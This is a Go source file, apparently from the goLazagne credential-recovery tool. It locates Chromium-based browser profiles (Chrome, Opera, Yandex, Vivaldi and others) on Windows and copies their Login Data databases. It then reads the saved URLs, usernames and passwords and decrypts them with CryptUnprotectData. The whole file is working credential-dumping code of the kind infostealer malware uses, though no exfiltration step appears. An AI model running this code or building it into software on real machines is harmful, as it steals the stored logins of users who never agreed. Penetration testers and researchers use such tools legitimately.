package browsers

import (
	"database/sql"
	"fmt"
	"github.com/buger/jsonparser"
	"github.com/kerbyj/goLazagne/common"
	"io/ioutil"
	"os"
)

func ChromeModuleStart(path string) ([]common.UrlNamePass, bool) {
	if _, err := os.Stat(path + "\\Local State"); err == nil {
		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
		if err != nil {
			return nil, false
		}
		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")

		var profileNames []string
		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
			profileNames = append(profileNames, string(key))
			return nil
		}, "info_cache")

		var temporaryDbNames []string
		for i := range profileNames {
			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileNames[i])
			if _, err := os.Stat(dbPath); err == nil {
				//randomDbName := common.RandStringRunes(10)

				file, _ := ioutil.TempFile(os.TempDir(), "prefix")
				err := common.CopyFile(dbPath, file.Name())
				if err != nil {
					return nil, false
				}
				temporaryDbNames = append(temporaryDbNames, file.Name())
			}
		}

		for dbNum := range temporaryDbNames {
			db, err := sql.Open("sqlite3", temporaryDbNames[dbNum])
			if err != nil {
				//log.Panic(err.Error())
				return nil, false
			}
			rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
			if err != nil {
				return nil, false
			}
			var actionUrl, username, password string
			var data []common.UrlNamePass
			for rows.Next() {
				rows.Scan(&actionUrl, &username, &password)
				//data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false)))
				data = append(data, common.UrlNamePass{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
			}

			os.Remove(temporaryDbNames[dbNum])
			// log.Println("Removing temp db")
			return data, true
		}
	}
	return nil, false
}

var (
	chromePathsUserData = []string{
		common.LocalAppData + "\\Google\\Chrome\\User Data",        // Google chrome
		common.AppData + "\\Opera Software\\Opera Stable",          // Opera
		common.LocalAppData + "\\Yandex\\YandexBrowser\\User Data", // Yandex browser
		common.LocalAppData + "\\Vivaldi\\User Data",               // Vivaldi
		common.LocalAppData + "\\CentBrowser\\User Data",           // CentBrowser
		common.LocalAppData + "\\Amigo\\User Data",                 // Amigo (RIP)
		common.LocalAppData + "\\Chromium\\User Data",              // Chromium
		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data",      // Sputnik
	}
)

func ChromeExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}

	var allCreds []common.UrlNamePass

	for i := range chromePathsUserData {
		if _, err := os.Stat(chromePathsUserData[i]); err == nil {

			var data, success = ChromeModuleStart(chromePathsUserData[i])
			if success && data != nil {
				//Result.Data = append(Result.Data, data...)
				allCreds = append(allCreds, data...)
			}
		}
	}

	if len(allCreds) == 0 {
		return EmptyResult
	} else {
		Result.Success = true
		return common.ExtractCredentialsResult{
			Success: true,
			Data:    allCreds,
		}
	}
}
